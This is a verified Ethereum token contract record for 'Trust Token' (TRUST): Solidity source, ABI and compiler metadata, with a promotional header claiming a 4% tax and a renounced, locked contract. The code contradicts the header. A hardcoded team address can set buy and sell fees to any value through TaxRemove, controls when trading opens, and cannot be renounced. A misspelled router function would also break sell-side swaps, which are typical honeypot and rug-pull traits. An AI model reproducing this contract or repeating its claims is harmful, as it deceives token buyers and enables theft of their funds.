{"SourceCode": "/*\r\n\r\nWelcome to $TRUST\r\n\r\n. \r\n\r\nOverview \r\n\r\nTRUST, a cutting-edge platform integrated with Telegram messenger, has been created to offer a secure environment for users to explore the world of decentralized finance. Whether you're a DeFi enthusiast, a project owner, or someone seeking assistance, the TRUST ecosystem is tailored to meet the needs of all parties involved. All bots within the TRUST framework will operate under a unified umbrella, ensuring that all services undergo thorough vetting and maintain a high level of security.\r\n\r\nLaunch Info: \r\n\r\n\u2716\ufe0f 100 Million Total Supply \r\n\u2716\ufe0f 4% Buy & Sell Tax \r\n\u2716\ufe0f 2 ETH Initial LP\r\n\u2716\ufe0f Locked & Renounced\r\n\u2716\ufe0f Big marketing planned before and after launch\r\n\u2716\ufe0f Many new features added to the ecosystem\r\n\r\nSocials :\r\n\r\nWebsite   : https://trustoken.tech\r\nTelegram : https://t.me/TrustERC\r\nTwitter     : https://twitter.com/Trust_ERC20\r\nGitBook    : https://trust-token.gitbook.io/trust-token-whitepaper\r\n\r\n*/\r\n\r\n// SPDX-License-Identifier: unlicense\r\n\r\npragma solidity 0.8.21;\r\n    \r\ninterface IUniswapV2Router02 {\r\n     function swapExactTokensForETHSupportingFeesxOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n    \r\n    contract TRUST {\r\n\r\n        constructor() {\r\n            balanceOf[msg.sender] = totalSupply;\r\n            allowance[address(this)][routerAddress] = type(uint256).max;\r\n            emit Transfer(address(0), msg.sender, totalSupply);\r\n        }\r\n\r\n        string public   _name = \"Trust Token\"; \r\n        string public   _symbol = \"TRUST\";  \r\n        uint8 public constant decimals = 18;\r\n        uint256 public constant totalSupply = 100000000 * 10**decimals;\r\n\r\n        uint256 buyFeesx = 0;\r\n        uint256 sellFeesx = 0;\r\n        uint256 constant swapAmount = totalSupply / 100;\r\n        \r\n        error Permissions();\r\n\r\n        function name() public view virtual returns (string memory) {\r\n        return _name;\r\n        }\r\n\r\n    \r\n        function symbol() public view virtual returns (string memory) {\r\n        return _symbol;\r\n        }    \r\n\r\n        event Transfer(address indexed from, address indexed to, uint256 value);\r\n        event Approval(\r\n            address indexed TeamMKT,\r\n            address indexed spender,\r\n            uint256 value\r\n        );\r\n\r\n        mapping (address => uint256) public balanceOf;\r\n        mapping (address => mapping (address => uint256)) public allowance;\r\n\r\n       \r\n        \r\n        function approve(address spender, uint256 amount) external returns (bool){\r\n            allowance[msg.sender][spender] = amount;\r\n            emit Approval(msg.sender, spender, amount);\r\n            return true;\r\n        }\r\n\r\n        function transferFrom(address from, address to, uint256 amount) external returns (bool){\r\n            allowance[from][msg.sender] -= amount;        \r\n            return _transfer(from, to, amount);\r\n        }\r\n\r\n        function transfer(address to, uint256 amount) external returns (bool){\r\n            return _transfer(msg.sender, to, amount);\r\n        }\r\n\r\n        address private pair;\r\n        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\r\n        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);\r\n        address payable constant TeamMKT = payable(address(0xd83CCd11427390440f7c81511DF36f718F366B29));\r\n\r\n        bool private swapping;\r\n        bool private tradingOpen;\r\n\r\n        \r\n\r\n        receive() external payable {}\r\n\r\n        \r\n\r\n        function _transfer(address from, address to, uint256 amount) internal returns (bool){\r\n            require(tradingOpen || from == TeamMKT || to == TeamMKT);\r\n\r\n            if(!tradingOpen && pair == address(0) && amount > 0)\r\n                pair = to;\r\n\r\n            balanceOf[from] -= amount;\r\n\r\n            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){\r\n                swapping = true;\r\n                address[] memory path = new address[](2);\r\n                path[0] = address(this);\r\n                path[1] = ETH;\r\n                _uniswapV2Router.swapExactTokensForETHSupportingFeesxOnTransferTokens(\r\n                    swapAmount,\r\n                    0,\r\n                    path,\r\n                    address(this),\r\n                    block.timestamp\r\n                );\r\n                TeamMKT.transfer(address(this).balance);\r\n                swapping = false;\r\n            }\r\n\r\n            if(from != address(this)){\r\n                uint256 FeesxAmount = amount * (from == pair ? buyFeesx : sellFeesx) / 100;\r\n                amount -= FeesxAmount;\r\n                balanceOf[address(this)] += FeesxAmount;\r\n            }\r\n            balanceOf[to] += amount;\r\n            emit Transfer(from, to, amount);\r\n            return true;\r\n        }\r\n\r\n        function EnableTrading() external {\r\n            require(msg.sender == TeamMKT);\r\n            require(!tradingOpen);\r\n            tradingOpen = true;        \r\n        }\r\n\r\n        function _RemeveTax(uint256 _buy, uint256 _sell) private {\r\n            buyFeesx = _buy;\r\n            sellFeesx = _sell;\r\n        }\r\n\r\n        function TaxRemove(uint256 _buy, uint256 _sell) external {\r\n            if(msg.sender != TeamMKT)        \r\n                revert Permissions();\r\n            _RemeveTax(_buy, _sell);\r\n        }\r\n    }", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"Permissions\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"TeamMKT\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"EnableTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_buy\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_sell\",\"type\":\"uint256\"}],\"name\":\"TaxRemove\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "TRUST", "CompilerVersion": "v0.8.21+commit.d9974bed", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://23b86a75dad82c5b4fb716a98308aeb638c2dce9c6048614b9b5e35ab5bee171"}